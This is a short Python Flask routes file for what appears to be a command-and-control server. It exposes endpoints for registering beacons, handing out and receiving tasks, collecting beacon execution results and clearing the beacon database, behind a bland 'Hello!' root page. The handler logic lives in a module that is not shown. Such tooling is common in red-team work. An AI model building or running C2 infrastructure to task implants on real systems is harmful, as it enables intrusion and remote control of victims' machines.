from flask import request, jsonify
from werkzeug.exceptions import BadRequest
from database import db, Beacon, Task, Result
from services import handle_register_beacon, handle_read_task, handle_write_task, handle_return_beacon_data, handle_clear_beacons_db

def register_routes(app):
    @app.route("/")
    def web_root():
        return "<p>Hello!</p>"

    @app.route("/c2/register_beacon", methods=['POST'])
    def register_beacon_route():
        return handle_register_beacon(request)

    @app.route("/c2/read_task", methods=['GET'])
    def read_task_route():
        return handle_read_task(request)

    @app.route("/c2/write_task", methods=['POST'])
    def write_task_route():
        return handle_write_task(request)

    @app.route("/c2/return_beacon_data", methods=['POST'])
    def return_execution_data():
        return handle_return_beacon_data(request)

    @app.route("/database/clear_beacons", methods=['POST'])
    def clear_beacons_db():
        return handle_clear_beacons_db(request)
